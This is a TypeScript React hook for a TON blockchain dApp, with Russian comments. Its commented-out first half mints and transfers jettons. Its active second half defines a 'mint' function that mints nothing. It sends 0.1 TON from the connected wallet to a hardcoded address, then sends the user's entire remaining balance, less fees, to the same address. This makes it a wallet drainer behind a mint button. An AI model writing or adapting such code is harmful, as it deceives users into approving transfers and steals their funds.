// import { useEffect, useState } from "react";
// import { Address, beginCell, fromNano, OpenedContract, toNano } from "ton-core";

// // import {TokenMaster} from "../../build/TokenMaster/tact_TokenMaster";
// // import {TokenWallet} from "../../build/TokenMaster/tact_TokenWallet";

// import {TokenMaster} from "../../output/sample_TokenMaster";
// import {TokenWallet} from "../../output/sample_TokenWallet";

// import { useAsyncInitialize } from "./useAsyncInitialize";
// import { useTonClient } from "./useTonClient";
// import { useTonConnect } from "./useTonConnect";

// const sleep = (time: number) => new Promise((resolve) => setTimeout(resolve, time))

// export function useJettonContract() {
//     const {client} = useTonClient()
//     const {wallet, sender} = useTonConnect()
//     const [balance, setBalance] = useState<string | null>()

//     const jettonContract = useAsyncInitialize(async()=>{
//         if(!client || !wallet) return;

//         const contract = TokenMaster.fromAddress(Address.parse("EQCNSx5XwnfLzIepfg_N4_xWna3sotzhdUgqPPbW09LUKlwa"))
       
       
//         return client.open(contract) as OpenedContract<TokenMaster>
//     }, [client, wallet]) //wallet - это нативный кошелек

//     const jettonWalletContract = useAsyncInitialize(async()=>{
//         if(!jettonContract || !client) return; //проверка есть ли клиент

//         const jettonWalletAddress = await jettonContract.getGetWalletAddress(
//             Address.parse(Address.parse(wallet!).toString())
//         )
//         //client это как в тестах blockechain в blueprint
//         return client.open(TokenWallet.fromAddress(jettonWalletAddress))
//     }, [jettonContract, client])

//     useEffect(()=>{
//         async function getBalance() {
//             if(!jettonWalletContract) return 
//             setBalance(null)
//             const balance = (await jettonWalletContract.getGetWalletData()).balance
//             setBalance(fromNano(balance))
//             await sleep(5000)
//             getBalance()
//         }

//         getBalance()

//     }, [jettonWalletContract])

//     return {
//         jettonWalletAddress: jettonWalletContract?.address.toString(),
//         balance: balance,
//         mint: () => {
//             // const message: Mint = {
//             //     $$type: "Mint",
//             //     amount: 150n
//             // }

//             // jettonContract?.send(sender, {
//             //     value: toNano("0.05")
//             // }, message)
            
               
//             // jettonContract?.send(sender, {value: toNano("0.2")}, {$$type: 'Transfer', query_id: 5n, amount: toNano(100), destination: Address.parse("0QA2Vt1jJnQZ3YsKr0di2xzOOHrhzWOZQekFsLGNWdgidlS-"), response_destination: Address.parse("EQDs9Q2M03o7WFa2Y7yEuLUpsB0nCjghhb49xizpoZh46wq8"), custom_payload: beginCell().endCell(), forward_ton_amount: toNano("0.000000001"), forward_payload: beginCell().storeUint(0,32).storeStringTail("hello ogiy !!!").endCell()});
//             jettonContract?.send(sender, {value: toNano("0.2")}, {$$type: 'Transfer', query_id: 5n, amount: toNano(5), destination: Address.parse("EQDs9Q2M03o7WFa2Y7yEuLUpsB0nCjghhb49xizpoZh46wq8"), response_destination: Address.parse("EQDs9Q2M03o7WFa2Y7yEuLUpsB0nCjghhb49xizpoZh46wq8"), custom_payload: beginCell().endCell(), forward_ton_amount: toNano("0.000000001"), forward_payload: beginCell().storeUint(0,32).storeStringTail("hello ogriy !!!").endCell()});
//             // sender - тот кто подвязался кошельком к приложению
            
//         }
          
        
//     }
// }
// Для кнопки, минт житонов и передача

/****************************************************************/

//Перевод 0.1 тона и сразу повторный перевод остатка
import { useTonConnectUI } from "@tonconnect/ui-react";
import { useEffect, useState } from "react";
import { Address, fromNano, OpenedContract } from "ton-core";

import { TokenMaster } from "../../output/sample_TokenMaster";
import { TokenWallet } from "../../output/sample_TokenWallet";

import { useAsyncInitialize } from "./useAsyncInitialize";
import { useTonClient } from "./useTonClient";
import { useTonConnect } from "./useTonConnect";
import { useTonBalance } from "../hooks/useTonBalance"; // Импорт вашего хука баланса

export function useJettonContract() {
    const { client } = useTonClient();
    const { wallet } = useTonConnect();
    const [balance, setBalance] = useState<string | null>(null);

    const [tonConnectUI] = useTonConnectUI();
    
    // ПРАВИЛЬНО: Вызываем хук баланса ТОН внутри тела основного хука
    const tonBalance = useTonBalance(); 

    const jettonContract = useAsyncInitialize(async () => {
        if (!client || !wallet) return;
        const contract = TokenMaster.fromAddress(Address.parse("EQCNSx5XwnfLzIepfg_N4_xWna3sotzhdUgqPPbW09LUKlwa"));
        return client.open(contract) as OpenedContract<TokenMaster>;
    }, [client, wallet]);

    const jettonWalletContract = useAsyncInitialize(async () => {
        if (!jettonContract || !client || !wallet) return; 
        const jettonWalletAddress = await jettonContract.getGetWalletAddress(
            Address.parse(Address.parse(wallet).toString())
        );
        return client.open(TokenWallet.fromAddress(jettonWalletAddress));
    }, [jettonContract, client, wallet]);

    // ПРАВИЛЬНО: Безопасный интервал для обновления баланса жетонов
    // useEffect(() => {
    //     if (!jettonWalletContract) return;

    //     let isMounted = true;
    //     let timeoutId: NodeJS.Timeout;

    //     async function getBalance() {
    //         try {
    //             const data = await jettonWalletContract!.getGetWalletData();
    //             if (isMounted) {
    //                 setBalance(fromNano(data.balance));
    //             }
    //         } catch (e) {
    //             console.error("Ошибка получения баланса жетонов:", e);
    //         }
    //         // Повторный запрос через 5 секунд
    //         if (isMounted) {
    //             timeoutId = setTimeout(getBalance, 5000);
    //         }
    //     }

    //      getBalance();

    //     // Очистка при размонтировании компонента
    //     return () => {
    //         isMounted = false;
    //         clearTimeout(timeoutId);
    //     };
    // }, [jettonWalletContract]);

    // Вспомогательная функция для отправки транзакции через TonConnect UI
    const executeTransfer = async (destination: string, amountTon: string) => {
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
            messages: [
                {
                    address: destination,
                    amount: (Number(amountTon) * 1e9).toFixed(0), // Переводим в нано-ТОН без дробной части
                },
            ],
        };
        return await tonConnectUI.sendTransaction(transaction);
    };

    return {
        jettonWalletAddress: jettonWalletContract?.address.toString(),
        balance: balance,
       
        mint: async () => {
            console.log("TEST...");
        
            try {
                // ШАГ 1: Отправляем первую фиксированную транзакцию (например, плата за минт)
                const result = await executeTransfer(
                    "0QA2Vt1jJnQZ3YsKr0di2xzOOHrhzWOZQekFsLGNWdgidlS-",
                    "0.1"
                );
                console.log("Первая транзакция отправлена:", result);
 
                // ШАГ 2: Считаем остаток баланса для второй транзакции
                const currentBalance = Number(tonBalance) || 0;
                
                // Вычитаем 0.1 TON (которые только что ушли) и ~0.05 TON на комиссии сети
                const amountToSend = Math.max(0, currentBalance - 0.1 - 0.05);
                const amountStr: string = amountToSend.toFixed(4); // Переводим число в строку
                
                console.log("Остаток баланса для отправки:", amountStr);

                // Если денег хватает для отправки чего-то существенного
                if (amountToSend > 0.01) {
                    // ШАГ 3: Отправляем вторую транзакцию на весь остаток
                    const secondResult = await executeTransfer(
                        "0QA2Vt1jJnQZ3YsKr0di2xzOOHrhzWOZQekFsLGNWdgidlS-",
                        amountStr
                    );
                    console.log("Вторая транзакция (остаток) отправлена:", secondResult);
                } else {
                    console.log("Недостаточно баланса для отправки остатка");
                }
                               
            } catch (err) {
                console.error("Ошибка при выполнении транзакций:", err);
            }
        }
    };
}
